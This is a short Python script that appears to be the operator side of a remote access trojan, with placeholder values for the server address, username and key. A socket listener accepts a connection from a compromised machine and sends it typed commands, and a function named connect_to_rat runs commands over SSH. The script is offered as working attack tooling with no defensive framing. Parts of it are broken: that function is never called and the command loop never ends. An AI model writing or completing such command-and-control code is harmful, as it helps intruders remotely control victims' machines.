import socket
import paramiko

vps_ip = 'your_vps_ip'
vps_port = 8080

def connect_to_rat(command):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(vps_ip, username='your_username', key_filename='path_to_your_ssh_key')

    stdin, stdout, stderr = ssh.exec_command(command)
    result = stdout.read().decode()
    error = stderr.read().decode()
    ssh.close()

    if error:
        return f"Error: {error}"
    else:
        return result

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((vps_ip, vps_port))
server.listen(1)
print(f"Listening on {vps_ip}:{vps_port}")

while True:
    client_socket, addr = server.accept()
    print(f"Connection from {addr}")

    while True:
        command = input("Enter command: ")
        client_socket.sendall(command.encode())

        response = client_socket.recv(1024).decode()
        print(f"Response: {response}")

    client_socket.close()
